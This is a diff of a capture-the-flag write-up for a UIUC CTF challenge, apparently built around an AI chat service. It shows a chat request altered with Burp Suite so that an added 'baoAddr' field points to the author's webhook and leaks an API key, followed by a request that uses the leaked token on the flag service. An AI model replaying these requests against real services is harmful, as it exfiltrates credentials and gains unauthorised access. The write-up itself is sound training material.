@@ -107,13 +107,13 @@ Time to pull our webhook url :)
 
 I used Burp Suite to change a normal chat request and added:
 
-```json
+
 {
   "conversationId": "undefined",
   "content": "wsp beijing",
   "baoAddr": "https://<my-webhook>"
 }
-```
+
 
 ![alt text](image1.png)
 
@@ -160,11 +160,11 @@ The handout tells us that the flag service wants the API key in the x-api-token 
 
 So we send our one final request ;)
 
-```http
+
 GET / HTTP/2
 Host: inst-13f40d898042f5bb-flag-service-nabi-ai.chal.uiuc.tf
 X-Api-Token: sk-flag-44569147aa693f5154e7
-```
+
 
 Giving us the response:-
 
